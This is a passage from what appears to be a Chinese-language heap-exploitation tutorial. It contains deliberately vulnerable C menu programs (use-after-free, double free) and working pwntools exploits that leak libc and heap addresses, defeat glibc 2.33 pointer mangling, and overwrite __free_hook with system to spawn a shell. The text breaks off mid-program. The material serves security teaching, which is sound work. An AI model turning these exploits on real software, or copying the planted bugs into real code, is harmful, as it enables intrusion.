class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> e:<br>        hc=<span class="hljs-built_in">int</span>(i,<span class="hljs-number">16</span>)^(xc+(off&amp;<span class="hljs-number">0xfff</span>))<br>        xc=hc<br>        off=off&gt;&gt;<span class="hljs-number">12</span><br>        uh.append(<span class="hljs-built_in">hex</span>(hc)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>).zfill(<span class="hljs-number">3</span>))<br>    heap_len=<span class="hljs-built_in">len</span>(h)-<span class="hljs-number">3</span><br>    uh=<span class="hljs-string">&#x27;&#x27;</span>.join(uh[::-<span class="hljs-number">1</span>])[-heap_len:]+<span class="hljs-string">&#x27;000&#x27;</span><br>    fd=<span class="hljs-built_in">int</span>(uh,<span class="hljs-number">16</span>)+off1<br>    <span class="hljs-keyword">return</span> fd<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">en_fd</span>(<span class="hljs-params">fd,next_</span>):<br>    <span class="hljs-keyword">return</span> (fd&gt;&gt;<span class="hljs-number">12</span>)^next_<br><br>p=process(<span class="hljs-string">&#x27;obo&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.33.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x58</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x4f8</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x58</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x58</span>)<br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x58</span>+p8(<span class="hljs-number">0x61</span>)<br>edit(<span class="hljs-number">0</span>,payload)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x600</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x4f8</span>)<br>show(<span class="hljs-number">1</span>)<br>list_d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>main_arena=list_d-<span class="hljs-number">0x4a0</span><br>malloc_hook=main_arena-<span class="hljs-number">0x10</span><br>libc.address=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x58</span>)<br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">5</span>)<br>show(<span class="hljs-number">2</span>)<br>heap_d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>heap_3=calc_fd(heap_d,<span class="hljs-number">0x290</span>+<span class="hljs-number">0x60</span>+<span class="hljs-number">0x500</span>+<span class="hljs-number">0x60</span>+<span class="hljs-number">0x10</span>)-<span class="hljs-number">0x10</span><br>heap_2=heap_3-<span class="hljs-number">0x60</span><br><br>edit(<span class="hljs-number">2</span>,p64(en_fd(heap_2+<span class="hljs-number">0x10</span>,free_hook)))<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x58</span>)<br>edit(<span class="hljs-number">3</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x58</span>)<br>edit(<span class="hljs-number">5</span>,p64(system))<br>free(<span class="hljs-number">3</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="UAF-use-after-free">UAF(use after free)</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">    程序在释放chunk时，忘记将指针清空，</span><br><span class="hljs-comment">    导致释放chunk之后依旧可以获取或修改chunk内容</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">    gcc uaf.c -o uaf</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span>&#123;<br>    setvbuf(<span class="hljs-built_in">stdin</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stdout</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-type">char</span> *chunk_list[<span class="hljs-number">20</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br><span class="hljs-type">int</span> size_list[<span class="hljs-number">20</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">get_int</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">20</span>]=<span class="hljs-string">&quot;&quot;</span>;<br>    read(<span class="hljs-number">0</span>,buf,<span class="hljs-number">10</span>);<br>    <span class="hljs-keyword">return</span> atoi(buf);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_data</span><span class="hljs-params">(<span class="hljs-type">char</span> *data,<span class="hljs-type">int</span> len)</span>&#123;<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">20</span>]=<span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>;i&lt;len;i++)&#123;<br>        read(<span class="hljs-number">0</span>,buf,<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">0</span>]==<span class="hljs-string">&#x27;\n&#x27;</span>)<br>              <span class="hljs-keyword">return</span>;<br>        data[i]=buf[<span class="hljs-number">0</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (ind &gt;=<span class="hljs-number">20</span> || chunk_list[ind]!=<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input size:&quot;</span>);<br>    <span class="hljs-type">int</span> size=get_int();<br>    <span class="hljs-keyword">if</span> (size&lt;=<span class="hljs-number">0</span> || size&gt;<span class="hljs-number">2048</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    chunk_list[ind]=(<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(size);<br>    size_list[ind]=size;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (chunk_list[ind]==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">free</span>(chunk_list[ind]);<br>    <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (chunk_list[ind]==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(chunk_list[ind]);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">edit</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (chunk_list[ind]==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-type">char</span> * buf=chunk_list[ind];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input data:&quot;</span>);<br>    get_data(buf,size_list[ind]);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1. create&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2. delete&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3. edit&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;4. show&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>);<br>    <span class="hljs-keyword">return</span> get_int();<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    init();<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-keyword">switch</span>(menu())&#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                    add();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                    delete();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>                    edit();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>                    show();<br>                    <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error mode&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> ; <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="UAF-示例分析">UAF 示例分析</h3><p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_null.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p><p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_null-1.jpg" srcset="/img/loading.gif" lazyload alt="add函数代码" title="add函数代码"></p><p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-uaf.jpg" srcset="/img/loading.gif" lazyload alt="delete函数代码" title="delete函数代码"></p><p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_null-4.jpg" srcset="/img/loading.gif" lazyload alt="show函数代码" title="show函数代码"></p><p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-off_by_one-3.jpg" srcset="/img/loading.gif" lazyload alt="edit函数代码" title="edit函数代码"></p><p><img src="/img/blog_img/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%B8%80/pwn-heap-uaf-1.jpg" srcset="/img/loading.gif" lazyload alt="get_data函数代码" title="get_data函数代码"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    利用uaf直接获取libc地址和chunk地址</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;data:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_fd</span>(<span class="hljs-params">c,off</span>):<br>    off1=off<br>    off=off<br>    h=<span class="hljs-built_in">hex</span>(c)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>)[::-<span class="hljs-number">1</span>]<br>    e=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(h),<span class="hljs-number">3</span>):<br>        e.append(h[i:i+<span class="hljs-number">3</span>][::-<span class="hljs-number">1</span>])<br>    uh=[]<br>    xc=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> e:<br>        hc=<span class="hljs-built_in">int</span>(i,<span class="hljs-number">16</span>)^(xc+(off&amp;<span class="hljs-number">0xfff</span>))<br>        xc=hc<br>        off=off&gt;&gt;<span class="hljs-number">12</span><br>        uh.append(<span class="hljs-built_in">hex</span>(hc)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>).zfill(<span class="hljs-number">3</span>))<br>    heap_len=<span class="hljs-built_in">len</span>(h)-<span class="hljs-number">3</span><br>    uh=<span class="hljs-string">&#x27;&#x27;</span>.join(uh[::-<span class="hljs-number">1</span>])[-heap_len:]+<span class="hljs-string">&#x27;000&#x27;</span><br>    fd=<span class="hljs-built_in">int</span>(uh,<span class="hljs-number">16</span>)+off1<br>    <span class="hljs-keyword">return</span> fd<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">en_fd</span>(<span class="hljs-params">fd,next_</span>):<br>    <span class="hljs-keyword">return</span> (fd&gt;&gt;<span class="hljs-number">12</span>)^next_<br><br>p=process(<span class="hljs-string">&#x27;uaf&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.33.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x58</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x4a8</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x58</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x500</span>)<br>edit(<span class="hljs-number">3</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>show(<span class="hljs-number">1</span>)<br>d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>main_arena=d-<span class="hljs-number">0x470</span><br>malloc_hook=main_arena-<span class="hljs-number">0x10</span><br>libc.address=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">2</span>)<br>heap_d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>heap_0=calc_fd(heap_d,<span class="hljs-number">0x2a0</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap_0))<br>heap_2=heap_0+<span class="hljs-number">0x60</span>+<span class="hljs-number">0x4b0</span><br>edit(<span class="hljs-number">2</span>,p64(en_fd(heap_2+<span class="hljs-number">0x10</span>,free_hook)))<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x58</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x58</span>)<br>edit(<span class="hljs-number">5</span>,p64(system))<br>free(<span class="hljs-number">3</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="double-free">double free</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">    使一个chunk的地址在bin中存在两次记录</span><br><span class="hljs-comment">    如果程序只允许在创建chunk时写入数据</span><br><span class="hljs-comment">    则在创建chunk时就可以修改bin结构</span><br><span class="hljs-comment">    double free需要和其他方法结合才能使用</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">    gcc double_free.c -o double_free</span><br><span class="hljs-comment">    这个例子是结合uaf与double free</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span>&#123;<br>    setvbuf(<span class="hljs-built_in">stdin</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stdout</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-type">char</span> *chunk_list[<span class="hljs-number">22</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br><span class="hljs-type">int</span> size_list[<span class="hljs-number">20</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">get_int</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">20</span>]=<span class="hljs-string">&quot;&quot;</span>;<br>    read(<span class="hljs-number">0</span>,buf,<span class="hljs-number">10</span>);<br>    <span class="hljs-keyword">return</span> atoi(buf);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_data</span><span class="hljs-params">(<span class="hljs-type">char</span> *data,<span class="hljs-type">int</span> len)</span>&#123;<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">20</span>]=<span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>;i&lt;len;i++)&#123;<br>        read(<span class="hljs-number">0</span>,buf,<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">0</span>]==<span class="hljs-string">&#x27;\n&#x27;</span>)<br>              <span class="hljs-keyword">return</span>;<br>        data[i]=buf[<span class="hljs-number">0</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (ind &gt;<span class="hljs-number">21</span> || chunk_list[ind]!=<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input size:&quot;</span>);<br>    <span class="hljs-type">int</span> size=get_int();<br>    <span class="hljs-keyword">if</span> (size&lt;=<span class="hljs-number">0</span> || size&gt;<span class="hljs-number">2048</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    chunk_list[ind]=(<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(size);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input data:&quot;</span>);<br>    get_data(chunk_list[ind],size);<br>    size_list[ind]=size;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">int</span> ind=get_int();<br>    <span class="hljs-keyword">if</span> (ind&gt;<span class="hljs-number">21</span> || chunk_list[ind]==<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;error\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">free</span>(chunk_list[ind]);<br>    size_list[ind]=<span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input index:&quot;</span>);<br>    <span class="hljs-type">int</span> ind=get_int();<br>    <span 